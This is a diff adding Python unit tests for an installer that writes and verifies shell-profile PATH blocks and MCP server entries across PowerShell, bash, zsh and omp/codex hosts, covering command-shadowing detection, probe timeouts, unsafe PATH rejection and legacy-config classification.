+        os.name == "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
+        "native Windows PowerShell unavailable",
+    )
+    def test_powershell_binds_real_npm_ps1_shim_to_selected_runtime(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = self._runtime_with_exe_node(base)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            bin_dir = base / "bin with space"
+            _npm_shims(bin_dir)
+            scope, profile = self._scope(base, runtime, bin_dir, "powershell")
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            self.assertEqual(
+                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
+                str(cli.resolve()),
+            )
+            _write(profile, hosts.render_resource(resource))
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            self.assertEqual(entry["status"], "pass", entry)
+
+
+# ---------------------------------------------------------------------------
+# R07: the actual winning PowerShell command is inspected, never filtered
+# ---------------------------------------------------------------------------
+
+
+class NativePowerShellShadowTests(unittest.TestCase):
+    @unittest.skipUnless(
+        os.name == "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
+        "native Windows PowerShell unavailable",
+    )
+    def test_profile_alias_shadowing_graft_fails_the_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            (bin_dir / "graft.ps1").write_text("exit 0\n", encoding="utf-8")
+            profile = base / "profile.ps1"
+            scope = {
+                "shell_profiles": [
+                    {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
+                ],
+                "decisions": {str(profile): "replace"},
+            }
+            resource = hosts.build_host_resources(scope, package_root=package)[0]
+            shadowed = (
+                hosts.render_resource(resource)
+                + b"Set-Alias graft C:\\Windows\\System32\\where.exe\n"
+            )
+            _write(profile, shadowed)
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            check = entry["host"]["checks"]["command_resolution"]
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-resolution-shadowed")
+
+class RealPowerShellWinningCommandTests(unittest.TestCase):
+    """Real pwsh winning-command precedence on POSIX (extension-less graft)."""
+
+    def _probe_entry(self, base: Path, extra: bytes):
+        package = _package(base)
+        # Space, apostrophe and unicode in the selected bin: the real probe
+        # exercises the managed block's quoting behaviorally.
+        bin_dir = base / "bin with space it's ünïcode"
+        bin_dir.mkdir()
+        graft = bin_dir / "graft"
+        graft.write_bytes(b"#!/bin/sh\nexit 0\n")
+        graft.chmod(0o755)
+        profile = base / "profile.ps1"
+        scope = {
+            "shell_profiles": [
+                {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
+            ],
+            "decisions": {str(profile): "replace"},
+        }
+        resource = hosts.build_host_resources(scope, package_root=package)[0]
+        _write(profile, hosts.render_resource(resource) + extra)
+        entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+            "shell_profiles"
+        ][0]
+        return entry["host"]["checks"]["command_resolution"]
+
+    @unittest.skipUnless(
+        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
+        "POSIX pwsh unavailable",
+    )
+    def test_alias_shadowing_fails_real_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            check = self._probe_entry(
+                Path(directory).resolve(), b"Set-Alias graft /usr/bin/false\n"
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-resolution-shadowed")
+
+    @unittest.skipUnless(
+        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
+        "POSIX pwsh unavailable",
+    )
+    def test_function_shadowing_fails_real_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            check = self._probe_entry(
+                Path(directory).resolve(), b"function global:graft { }\n"
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-resolution-shadowed")
+
+    @unittest.skipUnless(
+        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
+        "POSIX pwsh unavailable",
+    )
+    def test_unshadowed_winning_command_passes_real_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            check = self._probe_entry(Path(directory).resolve(), b"")
+            self.assertEqual(check["status"], "verified", check)
+
+
+# ---------------------------------------------------------------------------
+# R08: bash/zsh probes load the selected profile under real interactive rules
+# ---------------------------------------------------------------------------
+
+
+class InteractiveProfileProbeTests(unittest.TestCase):
+    @unittest.skipUnless(shutil.which("bash"), "bash unavailable")
+    def test_bash_profile_with_noninteractive_guard_proves_path(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            profile = base / ".bashrc"
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            _write_graft(bin_dir)
+            _write(profile, b"case $- in\n  *i*) ;;\n  *) return;;\nesac\n")
+            scope = {
+                "shell_profiles": [
+                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
+                ],
+                "decisions": {str(profile): "replace"},
+            }
+            resource = hosts.build_host_resources(scope, package_root=package)[0]
+            _write(profile, hosts.render_resource(resource))
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            self.assertEqual(entry["status"], "pass", entry)
+
+    @unittest.skipUnless(shutil.which("zsh"), "zsh unavailable")
+    def test_zsh_profile_with_noninteractive_guard_proves_path(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            profile = base / ".zshrc"
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            _write_graft(bin_dir)
+            _write(profile, b"[[ -o interactive ]] || return\n")
+            scope = {
+                "shell_profiles": [
+                    {"path": str(profile), "shell": "zsh", "bin": str(bin_dir)}
+                ],
+                "decisions": {str(profile): "replace"},
+            }
+            resource = hosts.build_host_resources(scope, package_root=package)[0]
+            _write(profile, hosts.render_resource(resource))
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            self.assertEqual(entry["status"], "pass", entry)
+
+# ---------------------------------------------------------------------------
+# R12 (retained contract, user-approved): an accepted project-level-only
+# route is never claimed as proven by the isolated user-wide probe
+# ---------------------------------------------------------------------------
+
+
+class OmpProjectRouteBoundaryTests(unittest.TestCase):
+    def test_project_only_route_is_not_proven_by_user_wide_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            skills = _skills_root(base, ["alpha"])
+            installed = skills / "sbtd-workflow-onboard"
+            project = base / "project"
+            managed = {
+                "type": "stdio",
+                "command": runtime["python"],
+                "args": _managed_args(installed, runtime),
+                "env": {"DO_NOT_TRACK": "1", "DNT": "1"},
+            }
+            _write(
+                project / ".omp" / "mcp.json",
+                json.dumps({"mcpServers": {"sbtd-graft": managed}}).encode("utf-8"),
+            )
+            host = _omp_host(
+                base, runtime, skills_roots=[skills], project_roots=[project]
+            )
+            scope = {"hosts": [host], "skills_roots": [str(skills)]}
+            before_tree = _tree_bytes(base)
+            rig = _ProbeRig(self, ["alpha"]).install()
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "hosts"
+            ][0]
+            checks = entry["host"]["checks"]
+            # The project-scoped equivalent entry is accepted at build, but the
+            # isolated user-wide probe fails closed on it: no host session is
+            # ever spawned and no fixture graph preparation happens.
+            self.assertEqual(checks["host_load"]["status"], "failed")
+            self.assertEqual(
+                checks["host_load"]["reason"], "effective-binding-not-aligned"
+            )
+            self.assertEqual(entry["status"], "fail")
+            self.assertEqual(
+                [spawn for spawn in rig.spawns if "--mode" in spawn[0]], []
+            )
+            # The real project and every other base file stay byte-identical.
+            self.assertEqual(_tree_bytes(base), before_tree)
+
+
+
+
+# ---------------------------------------------------------------------------
+# R13: OMP evidence is the authoritative structured registry, never prompt text
+# ---------------------------------------------------------------------------
+
+
+class OmpAuthoritativeRegistryTests(unittest.TestCase):
+    def _aligned_omp(self, base: Path, runtime, package, skills, project):
+        host = _omp_host(
+            base, runtime, skills_roots=[skills], project_roots=[project]
+        )
+        scope = {"hosts": [host], "skills_roots": [str(skills)]}
+        resource = hosts.build_host_resources(scope, package_root=package)[0]
+        _write(Path(host["config"]), hosts.render_resource(resource))
+        return host, scope
+
+    def test_structured_dump_tools_pass(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            skills = _skills_root(base, ["beta-skill"])
+            project = base / "project"
+            project.mkdir()
+            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
+            _ProbeRig(self, ["beta-skill"]).install()
+            result = hosts.verify_hosts(scope, package_root=package, probe=True)
+            entry = result["hosts"][0]
+            self.assertEqual(entry["status"], "pass", entry)
+            checks = entry["host"]["checks"]
+            self.assertEqual(checks["host_load"]["status"], "verified")
+
+    def test_prompt_text_uris_without_registered_tools_never_pass(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            skills = _skills_root(base, ["beta-skill"])
+            project = base / "project"
+            project.mkdir()
+            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
+            rig = _ProbeRig(self, ["beta-skill"]).install()
+            rig.omp_dump_tools = []
+            rig.omp_system_prompt = " ".join(
+                f"xd://mcp__sbtd_graft_{tool}" for tool in PINNED_TOOLS
+            )
+            result = hosts.verify_hosts(scope, package_root=package, probe=True)
+            entry = result["hosts"][0]
+            checks = entry["host"]["checks"]
+            self.assertEqual(checks["host_load"]["status"], "failed")
+            self.assertEqual(entry["status"], "fail")
+
+    def test_dump_tools_without_schemas_do_not_count(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            skills = _skills_root(base, ["beta-skill"])
+            project = base / "project"
+            project.mkdir()
+            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
+            rig = _ProbeRig(self, ["beta-skill"]).install()
+            rig.omp_dump_tools = [
+                {"name": f"mcp__sbtd_graft_{tool}", "description": "schema-less"}
+                for tool in PINNED_TOOLS
+            ]
+            result = hosts.verify_hosts(scope, package_root=package, probe=True)
+            self.assertEqual(result["hosts"][0]["status"], "fail")
+
+    def test_dump_tools_wrong_shape_is_protocol_invalid(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            skills = _skills_root(base, ["beta-skill"])
+            project = base / "project"
+            project.mkdir()
+            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
+            rig = _ProbeRig(self, ["beta-skill"]).install()
+            rig.omp_dump_tools = "not-a-list"
+            result = hosts.verify_hosts(scope, package_root=package, probe=True)
+            checks = result["hosts"][0]["host"]["checks"]
+            self.assertEqual(checks["host_load"]["status"], "failed")
+            self.assertEqual(checks["host_load"]["reason"], "protocol-evidence-invalid")
+
+
+# ---------------------------------------------------------------------------
+# R14: RPC stdin writes share the deadline; stalled children are reaped
+# ---------------------------------------------------------------------------
+
+
+class StalledChildDeadlineTests(unittest.TestCase):
+    def test_write_beyond_pipe_capacity_times_out_and_teardown_joins(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            env = hosts._probe_env(base, {})
+            proc = hosts._spawn(
+                [sys.executable, "-I", "-c", "import time; time.sleep(120)"],
+                env=env,
+                cwd=str(base),
+            )
+            # Watchdog unblocks the pre-fix blocking write so the red run
+            # terminates; the fixed code never reaches it.
+            watchdog = threading.Timer(8.0, proc.kill)
+            watchdog.daemon = True
+            watchdog.start()
+            started = time.monotonic()
+            try:
+                rpc = hosts._JsonLines(proc, 1.0)
+                with self.assertRaises(hosts._ProbeError) as caught:
+                    rpc.call("initialize", {"blob": "x" * (4 * 1024 * 1024)})
+                self.assertEqual(caught.exception.reason, "host-response-timeout")
+            finally:
+                exit_code = rpc.close()
+                watchdog.cancel()
+            self.assertLess(time.monotonic() - started, 30.0)
+            # The owned stalled child is terminated and joined, never leaked.
+            self.assertIsNotNone(proc.returncode)
+            self.assertIsNotNone(exit_code)
+            # Owned pipe handles are sealed and pump/drain threads finished:
+            # no ResourceWarning from Popen teardown at GC.
+            assert proc.stdin is not None and proc.stdout is not None
+            self.assertTrue(proc.stdin.closed)
+            self.assertTrue(proc.stdout.closed)
+            self.assertFalse(rpc._writer.is_alive())
+            self.assertFalse(rpc._reader.is_alive())
+
+    def test_healthy_child_close_seals_streams_and_threads(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            env = hosts._probe_env(base, {})
+            proc = hosts._spawn(
+                [
+                    sys.executable,
+                    "-I",
+                    "-c",
+                    (
+                        "import sys\n"
+                        "for line in sys.stdin:\n"
+                        "    sys.stdout.write(line)\n"
+                        "    sys.stdout.flush()\n"
+                    ),
+                ],
+                env=env,
+                cwd=str(base),
+            )
+            rpc = hosts._JsonLines(proc, 5.0)
+            # One live round trip (echo returns the request; no result payload).
+            self.assertIsNone(rpc.call("initialize", {"probe": True}))
+            # Graceful close: stdin EOF lets the healthy child exit 0, and the
+            # client seals every owned handle and finishes both threads.
+            self.assertEqual(rpc.close(), 0)
+            assert proc.stdin is not None and proc.stdout is not None
+            self.assertTrue(proc.stdin.closed)
+            self.assertTrue(proc.stdout.closed)
+            self.assertFalse(rpc._writer.is_alive())
+            self.assertFalse(rpc._reader.is_alive())
+
+
+# ---------------------------------------------------------------------------
+# R15: PATH entries that cannot be represented are refused before writing
+# ---------------------------------------------------------------------------
+
+
+class PathSeparatorRejectionTests(unittest.TestCase):
+    def _build(self, base: Path, shell: str, bin_dir: str):
+        return hosts.build_host_resources(
+            {
+                "shell_profiles": [
+                    {"path": str(base / "profile"), "shell": shell, "bin": bin_dir}
+                ]
+            },
+            package_root=_package(base),
+        )
+
+    @unittest.skipIf(os.name == "nt", "POSIX PATH separator case")
+    def test_posix_bin_with_colon_is_rejected_before_write(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            bin_dir = str(base / "bin:withcolon")
+            for shell in ("bash", "zsh", "powershell"):
+                with self.subTest(shell=shell):
+                    with self.assertRaises(ContractError) as caught:
+                        self._build(base, shell, bin_dir)
+                    self.assertEqual(caught.exception.code, "unsafe-path")
+            with self.assertRaises(ContractError) as caught:
+                hosts._shell_profile_candidate(b"", shell="bash", bin_dir="/a:b/bin")
+            self.assertEqual(caught.exception.code, "unsafe-path")
+
+    @unittest.skipIf(os.name == "nt", "POSIX PATH separator case")
+    def test_posix_semicolon_bin_is_representable(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            bin_dir = base / "bin;withsemicolon"
+            resources = self._build(base, "bash", str(bin_dir))
+            self.assertEqual(resources[0]["decision"], "install")
+
+    @unittest.skipUnless(os.name == "nt", "native Windows separator case")
+    def test_windows_bin_with_semicolon_is_rejected_for_powershell(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            with self.assertRaises(ContractError) as caught:
+                self._build(base, "powershell", str(base / "bin;with"))
+            self.assertEqual(caught.exception.code, "unsafe-path")
+
+    @unittest.skipUnless(os.name == "nt", "native Windows separator case")
+    def test_windows_drive_tail_colon_is_rejected_for_bash(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            with self.assertRaises(ContractError) as caught:
+                self._build(base, "bash", "C:\\tools:bad\\bin")
+            self.assertEqual(caught.exception.code, "unsafe-path")
+            # The Git Bash /c alias form stays supported.
+            resources = self._build(base, "bash", str(base / "bin"))
+            self.assertEqual(resources[0]["decision"], "install")
+
+
+# ---------------------------------------------------------------------------
+# R16: oh-my-pi normalizes to canonical omp through the inventory rule
+# ---------------------------------------------------------------------------
+
+
+class HostPlatformNormalizationTests(unittest.TestCase):
+    def test_oh_my_pi_platform_is_canonicalized_to_omp(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            host = _omp_host(base, runtime)
+            host["platform"] = "oh-my-pi"
+            resources = hosts.build_host_resources({"hosts": [host]}, package_root=package)
+            self.assertEqual(len(resources), 1)
+            self.assertEqual(resources[0]["kind"], "mcp")
+            self.assertEqual(resources[0]["host"]["platform"], "omp")
+            result = hosts.verify_hosts({"hosts": [host]}, package_root=package)
+            entry = result["hosts"][0]
+            self.assertEqual(entry["platform"], "omp")
+            self.assertEqual(entry["applicability"], "supported")
+            self.assertEqual(entry["disk"]["status"], "missing")
+
+    def test_oh_my_pi_profile_variant_resolves(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime, profile="work")
+            host["platform"] = "oh-my-pi"
+            resources = hosts.build_host_resources(
+                {"hosts": [host]}, package_root=_package(base)
+            )
+            self.assertEqual(len(resources), 1)
+            self.assertEqual(resources[0]["classification"], "missing")
+
+
+# ---------------------------------------------------------------------------
+# R18: legacy dimension separates valid unrelated configs from malformed ones
+# ---------------------------------------------------------------------------
+
+
+class LegacyMcpClassificationTests(unittest.TestCase):
+    def _legacy(self, host, package) -> dict:
+        return hosts.verify_hosts({"hosts": [host]}, package_root=package)["hosts"][0][
+            "legacy"
+        ]
+
+    def test_valid_codex_config_with_only_unrelated_servers_reports_none(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _codex_host(base, runtime)
+            _write(
+                Path(host["config"]),
+                b'[mcp_servers.other]\ncommand = "/usr/bin/other"\n',
+            )
+            self.assertEqual(
+                self._legacy(host, _package(base)), {"status": "none", "entries": []}
+            )
+
+    def test_valid_omp_config_with_only_unrelated_servers_reports_none(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime)
+            _write(
+                Path(host["config"]),
+                json.dumps(
+                    {"mcpServers": {"other": {"type": "stdio", "command": "/usr/bin/other"}}}
+                ).encode("utf-8"),
+            )
+            self.assertEqual(
+                self._legacy(host, _package(base)), {"status": "none", "entries": []}
+            )
+
+    def test_malformed_codex_config_reports_unknown(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _codex_host(base, runtime)
+            _write(Path(host["config"]), b"[mcp_servers\n")
+            legacy = self._legacy(host, _package(base))
+            self.assertEqual(legacy["status"], "unknown")
+            self.assertEqual(legacy["reason"], "invalid-config")
+
+    def test_malformed_omp_config_reports_unknown(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime)
+            _write(Path(host["config"]), b'{"mcpServers": ')
+            legacy = self._legacy(host, _package(base))
+            self.assertEqual(legacy["status"], "unknown")
+            self.assertEqual(legacy["reason"], "invalid-config")
+
+    def test_wrong_shape_servers_reports_unknown(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime)
+            _write(Path(host["config"]), b'{"mcpServers": "nope"}')
+            legacy = self._legacy(host, _package(base))
+            self.assertEqual(legacy["status"], "unknown")
+
+    def test_null_omp_servers_section_reports_unknown(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime)
+            _write(Path(host["config"]), b'{"mcpServers": null}')
+            legacy = self._legacy(host, _package(base))
+            self.assertEqual(legacy["status"], "unknown")
+            self.assertEqual(legacy["reason"], "invalid-config")
+
+    def test_nonobject_server_entries_report_unknown(self) -> None:
+        for label, payload in (
+            ("unrelated-null", {"mcpServers": {"other": None}}),
+            ("owned-null", {"mcpServers": {"sbtd-graft": None}}),
+        ):
+            with self.subTest(entry=label), tempfile.TemporaryDirectory() as directory:
+                base = Path(directory).resolve()
+                runtime = _runtime(base)
+                host = _omp_host(base, runtime)
+                _write(Path(host["config"]), json.dumps(payload).encode("utf-8"))
+                legacy = self._legacy(host, _package(base))
+                self.assertEqual(legacy["status"], "unknown")
+                self.assertEqual(legacy["reason"], "invalid-config")
+
+    def test_read_conflict_after_snapshot_reports_unknown(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _omp_host(base, runtime)
+            _write(
+                Path(host["config"]),
+                b'{"mcpServers":{"other":{"type":"stdio","command":"/usr/bin/o"}}}',
+            )
+            with mock.patch.object(
+                hosts,
+                "read_file",
+                side_effect=ContractError("state-conflict", "changed mid-read"),
+            ):
+                legacy = hosts._legacy_mcp(host)
+            self.assertEqual(legacy["status"], "unknown")
+            # Read races keep the pre-existing contract reason, distinct from
+            # malformed-content invalid-config.
+            self.assertEqual(legacy["reason"], "state-conflict")
+
+    def test_empty_config_reports_none(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _codex_host(base, runtime)
+            _write(Path(host["config"]), b"")
+            self.assertEqual(
+                self._legacy(host, _package(base)), {"status": "none", "entries": []}
+            )
 
 if __name__ == "__main__":
     unittest.main()
